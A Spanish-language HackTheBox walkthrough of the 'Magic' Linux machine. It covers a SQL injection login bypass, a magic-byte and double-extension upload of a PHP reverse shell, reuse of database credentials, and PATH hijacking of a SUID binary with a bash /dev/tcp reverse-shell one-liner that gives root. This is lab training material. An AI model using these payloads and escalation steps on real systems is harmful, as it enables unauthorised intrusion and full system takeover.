Propiedades:
- OS: Linux
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #file-upload #sqli #magic-numbers #suid #ltrace #php

![](assets/Pasted%20image%2020260201192300.png)
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ ping -c 1 10.129.9.6
PING 10.129.9.6 (10.129.9.6) 56(84) bytes of data.
64 bytes from 10.129.9.6: icmp_seq=1 ttl=63 time=88.6 ms

--- 10.129.9.6 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 88.610/88.610/88.610/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.9.6 -oG nmap/allPorts

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ sudo nmap -p 22,80 -sV -sC -Pn -n -sS -vvv 10.129.9.6 -oN nmap/target

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQClcZO7AyXva0myXqRYz5xgxJ8ljSW1c6xX0vzHxP/Qy024qtSuDeQIRZGYsIR+kyje39aNw6HHxdz50XSBSEcauPLDWbIYLUMM+a0smh7/pRjfA+vqHxEp7e5l9H7Nbb1dzQesANxa1glKsEmKi1N8Yg0QHX0/FciFt1rdES9Y4b3I3gse2mSAfdNWn4ApnGnpy1tUbanZYdRtpvufqPWjzxUkFEnFIPrslKZoiQ+MLnp77DXfIm3PGjdhui0PBlkebTGbgo4+U44fniEweNJSkiaZW/CuKte0j/buSlBlnagzDl0meeT8EpBOPjk+F0v6Yr7heTuAZn75pO3l5RHX
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOVyH7ButfnaTRJb0CdXzeCYFPEmm6nkSUd4d52dW6XybW9XjBanHE/FM4kZ7bJKFEOaLzF1lDizNQgiffGWWLQ=
|   256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0dM4nfekm9dJWdTux9TqCyCGtW5rbmHfh/4v3NtTU1
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Magic Portfolio
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Puerto 22 SSH  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- Puerto 80 HTTP Apache httpd 2.4.29

## Enumeración

### Puerto 80 HTTP

La pagina al parecer es una galería de imagenes.

![](assets/Pasted%20image%2020260201195703.png)

También existe un tab de login.

![](assets/Pasted%20image%2020260201200019.png)

#### Tecnologias Web.

Mediante los headers me puedo dar cuenta que la web corre sobre un Apache 2.4.29 - PHP.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/magic/CVE-2018-15473]
└─$ curl -I http://10.129.9.6/
HTTP/1.1 200 OK
Date: Mon, 02 Feb 2026 01:56:39 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

#### Fuzzing

Realice fuzzing para descubrir posibles directorios ocultos y lo único destacable es el directorio de `uploads`.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Machines/hackthebox/magic/CVE-2018-15473]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://magic.htb/FUZZ -e .php,.txt,.html,.js,.git

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev'
________________________________________________

 :: Method           : GET
 :: URL              : http://magic.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .php .txt .html .js .git
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 88ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 102ms]
login.php               [Status: 200, Size: 4221, Words: 1179, Lines: 118, Duration: 102ms]
assets                  [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 88ms]
upload.php              [Status: 302, Size: 2957, Words: 814, Lines: 85, Duration: 123ms]
index.php               [Status: 200, Size: 4053, Words: 491, Lines: 60, Duration: 114ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 90ms]
```

## Acceso Inicial.

Bypasse de manera sencilla el login con una SQLi:

```
' or 1=1-- -
```

![](assets/Pasted%20image%2020260201220654.png)

Al bypassear el login puedo acceder a la tab de subir una imagen.

Probé la subida de archivos y pude ver que:

- La web solo acepta `PNG`, `JPG` y `JPEG`
- Si trato de subir cualquier otro archivo que no sea un PNG, JPG Y JPEG obtengo una alerta de que este tipo de archivos no se aceptan.

![](assets/Pasted%20image%2020260201200925.png)

Al subir una imagen puedo verla reflejada en la pagina main:

![](assets/Pasted%20image%2020260201201055.png)

El codigo fuente me revela la ruta donde se sube mi imagen

```bash
/article><article class="item thumb span-1"><h2>1b09486b</h2><a href='images/uploads/bojji.png'
```

Puedo tratar de bypassear la restricciones de extensión haciendo uso de los [MagicNumbers](https://en.wikipedia.org/wiki/List_of_file_signatures).

- Los "Magic Numbers" no son mas que los primeros bytes de un archivo que los sistemas operativos utilizan para identificar el tipo de archivo, en este caso usamos el correspondiente para JPG, JPEG.

```bash
ÿØÿà
```

Aparte de los magic numbers jugamos con la doble extensión para pasar las validaciones.

```
.php.png
```

El payload se mira asi:

- Primero los magic numbers
- Segundo la reverse shell de [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

![](assets/Pasted%20image%2020260201205310.png)

- Al subirla podemos ver que nos regresa un "The file reev.php.png has been uploaded."

Ahora me voy a poner en escucha:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ sudo nc -nlvp 9001
```

y puedo acceder a mi reverse-shell desde la web.

```bash
http://magic.htb/images/uploads/rev.php.png
```

Obtengo conexión:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ sudo nc -nlvp 9001
[sudo] password for wndr:
listening on [any] 9001 ...
connect to [10.10.16.57] from (UNKNOWN) [10.129.9.6] 50780
Linux ubuntu 5.3.0-42-generic #34~18.04.1-Ubuntu SMP Fri Feb 28 13:42:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:53:04 up  1:30,  0 users,  load average: 0.00, 0.04, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Escalada de Privilegios.

En el directorio home puedo ver que existe otro usuario llamado theseus

```bash
www-data@ubuntu:/home$ ls
theseus
```

También puedo ver que en el directorio de la web `/var/www/Magic` se encuentra un archivo llamado `db.php5` que corresponde a la conexion de la web hacia la base de datos.

- Es el usuario `theseus` quien se conecta a la base de datos Magic.

```bash
www-data@ubuntu:/var/www/Magic$ ls
assets  db.php5  images  index.php  login.php  logout.php  upload.php
www-data@ubuntu:/var/www/Magic$ cat db.php5
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e->getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
```

Probé reutilizar esa contraseña para migrar al usuario theseus pero no tuve éxito.

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password:
su: Authentication failure
```

Enumerando los servicios puedo ver que mysql esta corriendo por el puerto 3306.

```bash
www-data@ubuntu:/var/www/Magic$ ss -nltp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
LISTEN   0         5                 127.0.0.1:631              0.0.0.0:*
LISTEN   0         128                       *:80                     *:*
LISTEN   0         128                    [::]:22                  [::]:*
LISTEN   0         5                     [::1]:631                 [::]:*
```

La maquina no tiene `msql client` por lo cual no puedo interactuar con la base de datos de manera interactiva.

Pero si puedo interactuar con la base de datos a través de PHP.

```php
www-data@ubuntu:/var/www/Magic$ php -r '$conn = new PDO("mysql:host=localhost;dbname=Magic", "theseus", "iamkingtheseus"); $stmt = $conn->query("SHOW TABLES"); while($row = $stmt->fetch()) print_r($row);'

Array
(
    [Tables_in_Magic] => login
    [0] => login
)

www-data@ubuntu:/var/www/Magic$ php -r '$conn = new PDO("mysql:host=localhost;dbname=Magic", "theseus", "iamkingtheseus"); $stmt = $conn->query("SELECT * FROM login"); while($row = $stmt->fetch(PDO::FETCH_ASSOC)) print_r($row);'

Array
(
    [id] => 1
    [username] => admin
    [password] => Th3s3usW4sK1ng
)
```

- Existía una tabla llamado login que contenía credenciales para un usuario admin.

Reutilicé esta contraseña para migrar al usuario theseus.

- theseus / Th3s3usW4sK1ng

```bash
www-data@ubuntu:/var/www/Magic$ su theseus
Password:
theseus@ubuntu:/var/www/Magic$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
```

Voy a generar una clave SSH para colocarla en el authorized_keys y obtener una shell mas estable (esto no es necesario para migrar a root, solo es comodidad).

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ ssh-keygen

┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ sudo python3 -m http.server 80


theseus@ubuntu:/.ssh$ wget http://10.10.16.57/id_rsa.pub
theseus@ubuntu:/.ssh$ mv id_rsa.pub authorized_keys
```

En tema de binarios SUID tenemos un montón, pero destaca el binario no estándar sysinfo

```bash
theseus@ubuntu:/home$ find / -perm -4000 2>/dev/null

/bin/sysinfo

theseus@ubuntu:/home$ ls -la /bin/sysinfo
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
```

Al ejecutarlo me muestra un montón de estadísticas y monitoreo de hardware

```bash
theseus@ubuntu:/dev/shm$ sysinfo

====================Disk Info====================
Disk /dev/loop0: 160.2 MiB, 167931904 bytes, 327992 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop1: 91.4 MiB, 95805440 bytes, 187120 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop2: 2.5 MiB, 2621440 bytes, 5120 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
```

- Este binario no tiene una flag `-h` ni `-v` solo puedo ejecutarlo y ver informacion del sistema.

### Debuggeando con ltrace.

Por lo cual puedo utilizar `ltrace` que es una herramienta que nos ayuda a debuggear un binario y ver que llamadas hace a bibliotecas externas.

```bash
theseus@ubuntu:~$ ltrace sysinfo
_ZNSt8ios_base4InitC1Ev(0x556f6bd22131, 0xffff, 0x7ffcac6a3558, 128)                                                               = 0
__cxa_atexit(0x7ffba9dc8a40, 0x556f6bd22131, 0x556f6bd22008, 6)                                                                    = 0
setuid(0)                                                                                                                          = -1
setgid(0)                                                                                                                          = -1
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(0x556f6bd22020, 0x556f6bb208f8, -160, 0)                                   = 0x556f6bd22020
_ZNSolsEPFRSoS_E(0x556f6bd22020, 0x7ffba9e38870, 0x556f6bd22020, 0x556f6bb2092d====================Hardware Info====================
)                                                   = 0x556f6bd22020
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev(0x7ffcac6a3420, 0x556f6bb2092e, 0, 2880)                                 = 0x7ffcac6a3430
popen("lshw -short", "r")
```

- sysinfo llamada a `popen` y ejecuta el comando `lshw` sin ruta absoluta.

### Path Hijacking.

El hecho de que el binario ejecute `lshw` sin especificar una ruta absoluta implica que es posible crear un binario malicioso con el mismo nombre (`lshw`) y manipular la variable de entorno `PATH` para que priorice la ejecución de dicho binario.

- Voy a crear un binario con el mismo nombre para entablarme una reverse-shell y manipular la path.

```bash
theseus@ubuntu:/dev/shm$ cat lshw
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.57/7001 0>&1'
theseus@ubuntu:/dev/shm$ export PATH=/dev/shm:$PATH
theseus@ubuntu:/dev/shm$ chmod +x lshw
```

Me tengo que poner en escucha:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ sudo nc -nlvp 7001
```

Y ahora puedo ejecutar sysinfo:

```bash
theseus@ubuntu:/dev/shm$ sysinfo
```

- Se queda pegado

Y en el listener obtengo conexión.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/magic]
└─$ sudo nc -nlvp 7001
[sudo] password for wndr:
listening on [any] 7001 ...
connect to [10.10.16.57] from (UNKNOWN) [10.129.9.6] 33036
root@ubuntu:/dev/shm# id
id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
```
